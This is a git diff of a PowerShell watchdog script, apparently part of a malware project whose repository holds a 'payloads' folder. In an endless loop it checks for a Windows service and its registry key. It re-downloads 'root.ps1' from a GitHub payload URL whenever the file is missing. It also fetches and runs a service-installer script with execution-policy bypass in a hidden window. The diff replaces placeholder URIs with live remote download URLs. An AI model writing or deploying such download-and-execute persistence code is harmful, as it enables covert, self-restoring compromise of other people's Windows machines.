@@ -9,19 +9,19 @@ $paths = @(
 
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
-if(($rootPath -eq "") -or ($rootPath -eq $null)){
+if(($rootPath -eq $null) -or ($rootPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $rootPath = $paths[$idx]
     $rootPath = "$rootPath\root.ps1"
-}else{
-    $rootPath = "$rootPath\root.ps1"
 }
+
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 $initServicePath = $paths[$idx]
 $initServicePath = "$initServicePath\init_service_root.ps1"
 
 function Check-ServiceReg{
-    $c = Get-Item -Path $regPath -ErrorAction SilentlyContinue
+    param([string]$path)
+    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
     if(-not($c)){
         return $true
     }
@@ -29,8 +29,9 @@ function Check-ServiceReg{
 }
 
 function Check-Service{
+    param([string]$name)
     try {
-        $d = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
         if(-not($d)){
             return $true
         }
@@ -42,16 +43,18 @@ function Check-Service{
 }
 
 while ($true) {
-    $regS = Check-ServiceReg
-    $serv = Check-Service
+    $regS = Check-ServiceReg -path $regPath
+    $serv = Check-Service -name $serviceName
 
     if(-not(Test-Path -Path $rootPath -PathType Leaf)){
-        iwr -uri "ROOT_SCRIPT_URI" -OutFile $rootPath
+        $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $rootPath = "$rootPath\root.ps1"
+        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
     }
     
     if($regS -or $serv){
-        iwr -uri "INTI_SERVICE_ROOT_URI" -OutFile $initServicePath
-        powershell.exe -ep bypass -noP -w hidden $initServicePath
+        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
+        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
     }
     Start-Sleep -Seconds 5
 }
